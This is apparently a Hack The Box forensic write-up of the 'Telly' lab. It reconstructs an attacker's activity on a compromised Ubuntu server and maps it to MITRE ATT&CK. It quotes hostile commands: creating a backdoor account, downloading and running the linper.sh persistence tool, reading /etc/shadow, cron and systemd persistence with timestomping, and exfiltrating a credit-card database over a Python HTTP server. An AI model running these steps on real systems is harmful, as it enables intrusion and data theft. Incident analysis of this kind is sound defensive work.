# Telly - Network and Attacker Behavior Investigation


This investigation is based on the **Telly** machine from Hack The Box.

The objective is analyze the evidence and reconstruct the attacker activity.

This investigation showed that the attacker had gained access to the Ubuntu machine:

- Hostname: `backup-secondary`
- IP Address: `192.168.72.136`
- Operating System: Ubuntu 24.04.3 LTS
- Kernel: `Linux 6.8.0-90-generic`

The attacker was already operating with `root` privileges on the compromised machine.

## 1. Checking the attacker privileges

I first checked the commands executed by the attacker after accessing the system.

The attacker executed the `id` command to verify the current privileges.

```text
uid=0(root) gid=0(root) groups=0(root)
```

```bash
ps
```

to check the currently running processes. The output showed the `login`, `bash`, and `ps`

## 2. Creating a new user account

The attacker then listed the contents of the `/root` directory.

After this, created a new user account called `cleanupsvc`.

```bash
sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd
```

This created a new account with a home directory and `/bin/bash` as the login shell.

The attacker then checked the `/etc/shadow` file.

The output confirmed that the `cleanupsvc` account had been added successfully.

This account could provide the attacker with another way to access the compromised machine even if the original access method was removed.

## 3. System and file system discovery

The attacker performed local system discovery by enumerating several directories.

```text
/
 /media
 /dev
 /opt
```

```bash
ls -la
```

to inspect the contents of the directories.

While enumerating the `/opt` directory, the attacker discovered a file named:

```text
credit-cards-25-blackfriday.db
```

Database containing sensitive credit card information.

## 4. Downloading the post-exploitation tool

The attacker changed to the `/tmp` directory and downloaded a script named `linper.sh`.

```bash
wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
```

The attacker then changed the file permissions to make the script executable.

```bash
chmod +x linper.sh
```

The attacker used the script for further system enumeration and post-exploitation activity.

## 5. Enumerating security defenses

The attacker executed the `linper.sh` script to enumerate security defenses.

```bash
bash linper.sh --enum-defenses
```

The script searched for writable directories and selected `/dev/shm` for temporary files.

It also attempted to enumerate Tripwire policies.

```text
Enumerating Tripwire Policies
None Found
```

This allowed the attacker to determine that there were no visible Tripwire policies that could potentially detect file modifications.

## 6. Credential access and persistence

The attacker then used `linper.sh` in stealth mode.

The activity included the use of the IP address:

```text
91.99.25.54
```

port:

```text
59
```

The script also accessed the `/etc/shadow` file and collected password hashes for the following accounts:

- `root`
- `cyberjunkie`
- `cleanupsvc`

The output confirmed that the attacker was able to access password hashes from the system.

The attacker then attempted to establish persistence through multiple locations.

```text
/var/spool/cron/crontabs/root
/etc/crontab
/etc/cron.d/
/etc/systemd/
/etc/rc.local
```

The tool reported multiple persistence mechanisms using different binaries and interpreters,

- `awk`
- `bash`
- `nc`
- `perl`
- `pwsh`
- `python3`
- `telnet`

```text
Persistence Installed: awk using /var/spool/cron/crontabs/root
Timestomped Door: /var/spool/cron/crontabs/root
```

This indicated that the attacker was attempting to establish persistent access while also hiding the timestamps of modified files.  
The tool also reported that temporary files were removed after the activity.

```text
Removed Temporary Files
```

This was another indication of the attacker attempting to reduce the amount of forensic evidence left on the compromised machine.

## 7. Collecting sensitive data && Deleting traces

After establishing persistence, the attacker returned to the `/opt` directory.

The attacker found this db file

```text
credit-cards-25-blackfriday.db
```

The attacker then started a Python HTTP server.

```bash
python3 -m http.server 6932
```

The server was listening on:

```text
0.0.0.0:6932
```

A request from the attacker machine `192.168.72.131` was then observed.

```text
192.168.72.131 - - [27/Jan/2026 10:49:54] "GET /credit-cards-25-blackfriday.db HTTP/1.1" 200 -
```

This confirmed that the attacker successfully downloaded the `credit-cards-25-blackfriday.db` file from the compromised machine.

After the file was transferred, the attacker stopped the HTTP server and remove the file completely from the victim.

``` bash
 rm credit-cards-25-blackfriday.db
```


## Attack Flow

The attacker activity can be summarized as:

```text
Initial Access
      ↓
Root Privileges
      ↓
Process and System Discovery
      ↓
File System Enumeration
      ↓
Create cleanupsvc Account
      ↓
Download linper.sh
      ↓
Enumerate Security Defenses
      ↓
Access /etc/shadow
      ↓
Establish Persistence
      ↓
Timestomp Files and Remove Temporary Files
      ↓
Discover Sensitive Database
      ↓
Start HTTP Server
      ↓
Transfer Database to 192.168.72.131
      ↓
Attempt to Remove Evidence
```

## Findings

-  Attacker had `root` access to `backup-secondary`.
-  Attacker created a new account named `cleanupsvc`.
-  executed `linper.sh`.
-  password hashes from `/etc/shadow`.
- `credit-cards-25-blackfriday.db`
- `192.168.72.131`.


## MITRE ATT&CK Mapping

|Tactic|Technique|Attacker Activity|
|---|---|---|
|Execution|Command and Scripting Interpreter|The attacker executed Linux commands and shell scripts|
|Privilege Escalation|Valid Accounts|The attacker was operating with root privileges|
|Discovery|Process Discovery|The attacker used `ps` to inspect running processes|
|Discovery|File and Directory Discovery|The attacker enumerated `/root`, `/opt`, `/dev`, and other directories|
|Persistence|Create Account|The attacker created the `cleanupsvc` account|
|Credential Access|OS Credential Dumping|The attacker accessed `/etc/shadow`|
|Command and Control|Application Layer Protocol|The attacker used an HTTP server for file transfer|
|Persistence|Scheduled Task/Job|The attacker attempted persistence using cron locations|
|Persistence|Create or Modify System Process|The attacker attempted persistence through systemd|
|Defense Evasion|Timestomp|The attacker modified timestamps of persistence locations|
|Defense Evasion|Indicator Removal|The attacker removed temporary files|
|Collection|Data from Local System|The attacker identified and collected the credit card database|
|Exfiltration|Exfiltration Over Web Service|The database was transferred using an HTTP server|

## Tools Used

- `id`
- `ps`
- `ls`
- `cat`
- `wget`
- `chmod`
- `linper.sh`
- `python3 -m http.server`
